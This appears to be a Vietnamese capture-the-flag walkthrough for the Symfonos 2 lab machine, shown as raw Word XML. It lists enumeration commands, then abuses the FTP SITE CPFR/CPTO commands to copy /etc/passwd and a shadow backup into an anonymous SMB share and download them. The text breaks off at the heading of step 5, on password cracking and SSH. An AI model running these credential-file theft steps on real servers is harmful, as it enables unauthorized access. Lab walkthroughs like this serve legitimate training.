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AFDE" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SYMFONOS 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B05B515" w14:textId="3B4E2A0C" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">IP máy Symfonos 2: </w:t>
      </w:r>
      <w:r w:rsidR="0088544F">
        <w:t>192.168.56.121</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">IP máy Kali: </w:t>
      </w:r>
      <w:r>
        <w:t>192.168.56.105</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0500D3E1" w14:textId="3EFDB03F" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Đường dẫn tải máy ảo và tài nguyên: </w:t>
      </w:r>
      <w:r w:rsidR="00C16E4C" w:rsidRPr="00C16E4C">
        <w:t>https://drive.google.com/drive/folders/1zxBk50_2vt5ifhvoCKHA7eSNTzd7f294</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BCD0BC6" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Dò quét mạng và dịch vụ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="544964C6" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Xác định địa chỉ IP, cổng mở và thông tin SMB.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EABE276" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="431B9D3D" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>netdiscover -i eth1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="156BF4DF" w14:textId="4620FF78" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">nmap -A </w:t>
      </w:r>
      <w:r w:rsidR="0088544F">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>192.168.56.121</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="699DBBF7" w14:textId="67D0C695" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">enum4linux </w:t>
      </w:r>
      <w:r w:rsidR="0088544F">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>192.168.56.121</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6340F255" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Netdiscover tìm máy mục tiêu; Nmap nhận diện dịch vụ; Enum4linux thu thập thông tin SMB.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="102DCA57" w14:textId="77777777" w:rsidR="0088544F" w:rsidRDefault="0088544F">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5002678C" wp14:editId="77849E29">
            <wp:extent cx="6217920" cy="1669415"/>
            <wp:effectExtent l="0" t="0" r="0" b="6985"/>
            <wp:docPr id="3034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4008" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="1669415"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E95AE66" w14:textId="363335D3" w:rsidR="0088544F" w:rsidRDefault="0088544F" w:rsidP="0088544F">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="65A4A2F0" wp14:editId="3E1DF90A">
            <wp:extent cx="6217920" cy="2658110"/>
            <wp:effectExtent l="0" t="0" r="0" b="8890"/>
            <wp:docPr id="8884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00593" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="2658110"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B89935" w14:textId="0B523800" w:rsidR="00E122D8" w:rsidRDefault="00E122D8" w:rsidP="0088544F">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6C3B1092" wp14:editId="7E28ABD6">
            <wp:extent cx="6217920" cy="3166110"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="602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450" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="3166110"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B9B774" w14:textId="7153F100" w:rsidR="00E122D8" w:rsidRDefault="00E122D8" w:rsidP="0088544F">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3C51766D" wp14:editId="3D8CA394">
            <wp:extent cx="6217920" cy="1842135"/>
            <wp:effectExtent l="0" t="0" r="0" b="5715"/>
            <wp:docPr id="149662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7375" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="1842135"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F206CAD" w14:textId="78071D2E" w:rsidR="00E122D8" w:rsidRPr="0088544F" w:rsidRDefault="00E122D8" w:rsidP="0088544F">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="43F76BF7" wp14:editId="118FD4CD">
            <wp:extent cx="6217920" cy="2027555"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="195118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81846" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId10"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="2027555"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="304B6E67" w14:textId="30B0F82E" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Truy cập SMB và tải tệp log</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D730A5" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Lấy tệp log.txt từ thư mục backups trong share anonymous.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="527211DE" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D244903" w14:textId="0AE1E8AC" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>smbclient //</w:t>
      </w:r>
      <w:r w:rsidR="0088544F">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>192.168.56.121</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>/anonymous</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7411F059" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cd backups</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F3E74B3" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>get log.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A0FE64C" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>exit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F02C168" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Smbclient truy cập thư mục chia sẻ không cần tài khoản, chuyển vào backups và tải log.txt về Kali.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0578CCA7" w14:textId="77777777" w:rsidR="00E122D8" w:rsidRDefault="00E122D8">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2BF84FCE" wp14:editId="7F97A0B9">
            <wp:extent cx="6217920" cy="2261235"/>
            <wp:effectExtent l="0" t="0" r="0" b="5715"/>
            <wp:docPr id="70795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54510" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId11"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="2261235"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AD2F5BC" w14:textId="77777777" w:rsidR="00E122D8" w:rsidRDefault="00E122D8">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5CA64294" wp14:editId="1EB4A551">
            <wp:extent cx="6217920" cy="4170680"/>
            <wp:effectExtent l="0" t="0" r="0" b="1270"/>
            <wp:docPr id="12530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2024" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId12"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="4170680"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C5E4E6" w14:textId="67E04360" w:rsidR="00E122D8" w:rsidRPr="00E122D8" w:rsidRDefault="00E122D8" w:rsidP="00E122D8">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="21859A9C" wp14:editId="109684C3">
            <wp:extent cx="6217920" cy="4170680"/>
            <wp:effectExtent l="0" t="0" r="0" b="1270"/>
            <wp:docPr id="27526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8366" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId12"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="4170680"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="502BC3D1" w14:textId="1336DD42" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Sao chép passwd và shadow bằng FTP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A0411AD" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Lợi dụng các lệnh SITE CPFR và SITE CPTO để đưa tệp hệ thống vào thư mục chia sẻ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4926F124" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23A6140F" w14:textId="52FD907D" w:rsidR="00E122D8" w:rsidRPr="00E122D8" w:rsidRDefault="00E122D8" w:rsidP="00E122D8">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E122D8">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:r w:rsidRPr="00C16E4C">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ftp 192.168.56.121</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B22E51" w14:textId="2A832B86" w:rsidR="00E122D8" w:rsidRPr="00E122D8" w:rsidRDefault="00E122D8" w:rsidP="00E122D8">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E122D8">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">      anonymous</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75FDBD01" w14:textId="6929CDDB" w:rsidR="00B960E3" w:rsidRDefault="00E122D8" w:rsidP="00E122D8">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>site cpfr /etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2248C1C8" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>get /etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C3ED738" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>site cpto /home/aeolus/share/passwd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D356B5" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>site cpfr /var/backups/shadow.bak</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53B25603" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>site cpto /home/aeolus/share/shadow.bak</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B9A9F75" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>SITE CPFR chọn tệp nguồn và SITE CPTO đặt vị trí đích. Tài liệu sử dụng cơ chế này để sao chép passwd và shadow.bak vào thư mục của aeolus.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FACADC8" w14:textId="0A1B45C4" w:rsidR="00B960E3" w:rsidRDefault="00B831E7">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="535021E1" wp14:editId="7C9549E0">
            <wp:extent cx="6217920" cy="3906520"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="3404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8208" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId13"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="3906520"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>4. Tải dữ liệu xác thực qua SMB</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E93B9E2" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tải passwd và shadow.bak về Kali.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="744EDFFA" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10F36199" w14:textId="6349BB5A" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>smbclient //</w:t>
      </w:r>
      <w:r w:rsidR="0088544F">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>192.168.56.121</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>/anonymous</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F3F416" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>get passwd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20E7D11A" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>get shadow.bak</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="784D9581" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Truy cập lại share anonymous và lấy hai tệp đã được sao chép.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="382D3AC7" w14:textId="77777777" w:rsidR="00F56C71" w:rsidRDefault="00F56C71">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6B7C2493" wp14:editId="6386CFEA">
            <wp:extent cx="6217920" cy="2336800"/>
            <wp:effectExtent l="0" t="0" r="0" b="6350"/>
            <wp:docPr id="17627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751" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId14"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="2336800"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1172526D" w14:textId="791635AE" w:rsidR="00F56C71" w:rsidRDefault="00F56C71" w:rsidP="00F56C71">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="64164E91" wp14:editId="59C737E9">
            <wp:extent cx="6217920" cy="3856355"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="164824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0562" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId15"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="3856355"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF5D0F6" w14:textId="4F4876AD" w:rsidR="00F56C71" w:rsidRPr="00F56C71" w:rsidRDefault="00F56C71" w:rsidP="00F56C71">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="29FDA909" wp14:editId="3C462B69">
            <wp:extent cx="6217920" cy="2583180"/>
            <wp:effectExtent l="0" t="0" r="0" b="7620"/>
            <wp:docPr id="6793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7173" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId16"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="2583180"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="26DBF895" w14:textId="45E33320" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. Khôi phục mật khẩu và đăng nhập SSH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FDC2320" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tìm mật khẩu của aeolus và truy cập máy mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B3C68E8" w14:textId="77777777" w:rsidR="00B960E3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
